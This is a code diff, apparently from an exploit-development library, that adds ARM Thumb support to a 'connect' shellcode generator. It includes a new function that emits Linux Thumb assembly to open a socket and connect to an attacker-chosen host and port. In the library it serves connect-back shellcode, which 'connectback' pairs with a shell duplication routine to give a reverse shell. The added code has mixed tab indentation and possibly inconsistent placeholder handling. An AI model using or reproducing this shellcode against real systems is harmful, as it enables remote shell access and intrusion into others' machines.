@@ -7,7 +7,7 @@ def connectback(host, port):
     Standard connect back type shellcode."""
     return connect(host, port), dupsh()
 
-@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
+@shellcode_reqs(arch=['i386', 'amd64', 'thumb'], os=['linux', 'freebsd'], network='ipv4')
 def connect(host, port, arch = None, os = None):
     """Args: host, port
     Connects to host on port.  Leaves socket in EBP."""
@@ -21,9 +21,57 @@ def connect(host, port, arch = None, os = None):
             return _connect_freebsd_i386(host, port)
     elif arch == 'amd64':
         return _connect_amd64(host, port, os)
+    elif arch == 'thumb':
+				if os in ['linux']:
+						return _connect_linux_thumb(host, port)
     else:
         no_support('connect', os, arch)
 
+def _connect_linux_thumb(host, port):
+		return """
+						/* Connect to %(hostname)s on %(portnum)d */
+						/* Socket file desciptor is placed in r6 */
+
+						/* To avoid null bytes we must first set sa_family in sockaddr struct */
+						mov r1, #AF_INET
+						lsl r1, #16
+						mov r2, pc
+						add r2, #4
+						str r1, [r2, #24]
+
+						/* sock = socket(AF_INET, SOCK_STREAM, 0) */
+						mov r0, #AF_INET
+						mov r1, #1
+						sub r2, r2, r2
+
+						/* SYS_socket = 281 */
+						lsl r7, r1, #8
+						add r7, r7, #25
+						svc 1
+
+						/* save fd in r6 */
+						mov r6, r0
+
+						/* connect(r0, &addr, 16) */
+						add r1, pc, #8
+						add r1, r1, #2
+						add r2, #16
+						add r7, #2
+						svc 1
+
+						b connect_end
+
+						/* Dummy for placing AF_INET */
+						.byte 65,65,65,65
+						.short %(port)d
+						.byte %(host)s
+
+						connect_end:
+""" % {'hostname': host,
+			 'portnum' : port,
+			 'host'    : host.replace('.',','),
+			 'port'    : htons(port)
+			 }
 def _connect_linux_i386(host, port):
     return """
             ;; Connect to %(hostname)s on %(portnum)d
